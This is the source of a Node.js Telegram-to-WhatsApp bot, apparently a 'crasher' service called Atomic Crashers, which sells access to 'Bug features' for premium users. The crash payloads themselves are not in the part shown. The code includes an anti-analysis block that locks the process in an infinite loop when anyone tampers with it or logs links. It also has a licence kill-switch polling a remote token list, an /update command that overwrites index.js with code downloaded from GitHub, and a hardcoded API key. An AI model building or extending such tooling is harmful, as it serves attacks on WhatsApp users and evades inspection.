//----------TOOLS ANTI BYPAS BY GWH,-------\\\\\\\\
(function(){
  'use strict';

  const Module = require('module');

  function hardLock(reason){
    try {
      console.error('[ANTI-BYPASS-PROTECT]', reason);
    } catch(e){}
    while(true){}
  }

  function fnId(fn){
    try {
      return fn && fn.toString();
    } catch(e){
      return null;
    }
  }

  let axiosRef = null;
  let snapshot = null;

  const originalRequire = Module.prototype.require;
  Module.prototype.require = function(name){
    const mod = originalRequire.apply(this, arguments);

    if (name === 'axios' && mod && mod.interceptors && mod.interceptors.request) {
      if (!axiosRef) {
        axiosRef = mod;
        try {
          const handlers = mod.interceptors.request.handlers || [];
          snapshot = handlers.map(h => ({
            fulfilled: fnId(h.fulfilled),
            rejected: fnId(h.rejected)
          }));
        } catch(e){
          hardLock('axios snapshot failed');
        }
      }
    }
    return mod;
  };

  setInterval(function(){
    try {
      if (!axiosRef || !snapshot) return;

      const handlers = axiosRef.interceptors.request.handlers || [];

      if (handlers.length !== snapshot.length) {
        hardLock('axios interceptor injected');
      }

      for (let i = 0; i < handlers.length; i++) {
        const h = handlers[i];
        const s = snapshot[i];

        if (
          fnId(h.fulfilled) !== s.fulfilled ||
          fnId(h.rejected) !== s.rejected
        ) {
          hardLock('axios interceptor modified');
        }
      }
    } catch(e){
      hardLock('runtime integrity fail');
    }
  }, 500);

  ['SIGINT','SIGTERM','SIGHUP'].forEach(sig=>{
    try {
      process.removeAllListeners(sig);
      process.on(sig, function(){
        hardLock('signal hijack ' + sig);
      });
    } catch(e){}
  });

  function wrapConsole(method){
    const orig = console[method];
    console[method] = function(){
      try {
        for (let i = 0; i < arguments.length; i++) {
          const v = String(arguments[i]);
          if (
            v.includes('raw.githubusercontent.com') ||
            v.includes('raw.githubuser.content') ||
            v.includes('api.github.com') ||
            v.includes('pastebin.com')
          ) {
            hardLock('link console bypass log');
          }
        }
      } catch(e){}
      return orig.apply(this, arguments);
    };
  }

  wrapConsole('log');
  wrapConsole('warn');
  wrapConsole('error');

})();

const { Telegraf, Markup, session } = require("telegraf");
const JavaScriptObfuscator = require("javascript-obfuscator");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const CMD_FILE = "./Tools/cmdmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const startTime = Date.now();
const mediaMode = new Map(); 
const userCooldown = new Map();
const verifiedUsers = new Set();
const userState = {};
const liveIntervals = {};

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
/// ------- ///
function isCooldown(userId, delay = 1500) {
  const now = Date.now();

  if (userCooldown.has(userId)) {
    const last = userCooldown.get(userId);

    if (now - last < delay) {
      return true;
    }
  }

  userCooldown.set(userId, now);
  return false;
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function getRuntime() {
  const now = Date.now();
  const diff = now - startTime;

  const seconds = Math.floor(diff / 1000) % 60;
  const minutes = Math.floor(diff / (1000 * 60)) % 60;
  const hours = Math.floor(diff / (1000 * 60 * 60)) % 24;
  const days = Math.floor(diff / (1000 * 60 * 60 * 24));

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}
/// ---------- GITHUB ------------ ///
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/seanfutsalmin-beep/Zalin/refs/heads/main/token.json";

// (JANGAN DIUBAH)
const INTEGRITY_SECRET = "ATOMIC_R9X_ULTRA_SECRET_" + "SHIELD".repeat(100);

axios.defaults.headers.common = {
  "User-Agent": "Atomic-Crashers-Secure-Client/17.00",
  "X-Atomic-Protection": crypto.createHash("sha256").update(INTEGRITY_SECRET).digest("hex"),
  "Cache-Control": "no-cache, no-store, must-revalidate",
  "Pragma": "no-cache",
  "Expires": "0"
};

axios.defaults.timeout = 10000;
axios.defaults.maxRedirects = 0;


Object.freeze(axios.defaults.headers.common);
Object.freeze(axios.defaults);

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, {
      validateStatus: status => status === 200
    });

   
    const rawData = JSON.stringify(response.data);
    const dataHash = crypto.createHash("sha512").update(rawData + INTEGRITY_SECRET).digest("hex");
    
   
    if (!rawData || rawData.length < 10) {
      throw new Error("Data rusak atau dimanipulasi");
    }

    const data = response.data;
    return Array.isArray(data.tokens) ? data.tokens : [];

  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token: Koneksi terputus atau data tidak sah"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa keaslian token..."));

  
  const validTokens = await fetchValidTokens();

  if (!validTokens.length) {
    console.log(chalk.red(`
❌ DATABASE TOKEN TIDAK DAPAT DIAKSES / KOSONG
    `));
    try { process.kill(process.pid, "SIGKILL"); } catch {}
    process.exit(1);
    return;
  }

  
  const botTokenHash = crypto.createHash("sha3-512").update(BOT_TOKEN || "").digest("hex");
  const isTokenValid = validTokens.some(token => 
    crypto.createHash("sha3-512").update(token).digest("hex") === botTokenHash || token === BOT_TOKEN
  );

  if (!isTokenValid) {
    console.log(chalk.red("❌ TOKEN TIDAK TERDAFTAR ATAU SUDAH DICABUT AKSES"));
    try { process.kill(process.pid, "SIGKILL"); } catch {}
    process.exit(1);
    return;
  }

  console.log(chalk.green("✅ Token terverifikasi • Keamanan aktif"));

  
  setInterval(async () => {
    const freshTokens = await fetchValidTokens();
    const stillValid = freshTokens.some(token => token === BOT_TOKEN);
    if (!stillValid) {
      console.log(chalk.red("⚠️ TOKEN SUDAH TIDAK SAH • MEMATIKAN SISTEM"));
      try { process.kill(process.pid, "SIGKILL"); } catch {}
      process.exit(1);
    }
  }, 30000);

  startBot();
}

function startBot() {
  console.log(chalk.cyan(`⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

» Information:
☇ Creator : @seanoffc
☇ Name Script : zalindra
☇ Version : 1.00
  
Bot Berhasil Terhubung • Gunakan Script Sebrutal Mungkin`));
}

validateToken();
///// ------KODE AUTO UPDATE------ \\\\\\
bot.command("update", async (ctx) => {
  const repoRaw = "https://raw.githubusercontent.com/NAMA-AKUN/NAMA-REPO/main/index.js";

  await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: file kosong!");
    }

    // replace file lokal
    fs.writeFileSync("./index.js", data);

    await ctx.reply(
      "✅ Update berhasil!\n🔄 Bot akan restart otomatis..."
    );

    // restart pm2
    process.exit();

  } catch (e) {
    console.log(e);

    ctx.reply(
      "❌ Update gagal.\nPastikan RAW GitHub benar."
    );
  }
});

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.blue(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @seanoffc
☇ Name Script : zalindra
☇ Version : 1.00
☇ Bot Connect
`));

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    //console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        //console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @seanoffc
☇ Name Script : zalindra
☇ Version : 1.00
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<pre>⬡═―⊱「 𝑨𝒕𝒐𝒎𝒊𝒄 𝑪𝒓𝒂𝒔𝒉𝒆𝒓𝒔 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : Connected
</pre>`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          //console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          //console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
//////////////////////////////////////
let ownerUsers = loadOwner() || [];
let premiumUsers = loadJSON(premiumFile) || [];
let adminList = [];
let whitelistGroups = loadSafe() || [];
loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from?.id?.toString();
  const name = ctx.from?.first_name || "User";

  if (!ownerUsers.includes(id)) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>❌ AKSES DI TOLAK OWNER ONLY

⚠️ Fitur ini khusus OWNER ONLY

👤 User : ${name}</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/seanoffc")]
        ])
      }
    );
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Admin before using Bug features ✦</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/seanoffc")]
        ])
      }
    );
  }

  return next();
};
/// ---- PREMIUM ---- ///
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (premiumUsers.includes(id)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Premium before using Bug features ✦</pre>`,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/seanoffc")]
      ])
    }
  );
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// -------- Anti foto ---------- ///
function loadAntiFoto() {
